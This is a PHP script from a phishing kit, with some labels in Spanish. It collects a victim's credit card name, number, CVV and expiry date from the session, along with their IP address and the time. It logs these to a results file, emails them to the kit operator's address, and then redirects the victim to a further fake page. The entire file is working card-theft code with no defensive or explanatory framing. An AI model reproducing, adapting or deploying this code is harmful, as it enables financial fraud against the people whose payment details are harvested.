<?php

session_start();

include './edit/email.php';

$time = date('d/m/Y G:i:s');

$ip = getenv("REMOTE_ADDR");

$S_Z118 .= "
<html>
<br>
</font><br>
 [Dueño de la CC]   = <font style='color:#0070ba;'>".$_SESSION['_nameoncard_']."</font><br>
 [CC NUM]    = <font style='color:#0070ba;'>".$_SESSION['_cardnumber_']."</font><br>
 [CVV]	           = <font style='color:#0070ba;'>".$_SESSION['_csc_']."</font><br>
 [Expiracion]       = <font style='color:#0070ba;'>".$_SESSION['_expdate_']."</font><br>
[ip info] = <font style='color:#0070ba;'>"."http://www.geoiptool.com/?IP=".$ip."</font><br>
[time]    =   <font color='#3366FF'>".$time."</font><br>
</html></div>\n";


$f = fopen("../rezlt.html", "a");
	fwrite($f, $S_Z118);

$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "Datos CC VH [ " .$ip. " - " .$smile." ] ";
$headers .= "From: LOG VH" . "\r\n";

mail($yourmail, $subject, $S_Z118 , $headers);

 header("Location:./lodvbv.php?websrc=".$_SESSION['_expdate_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");



?>
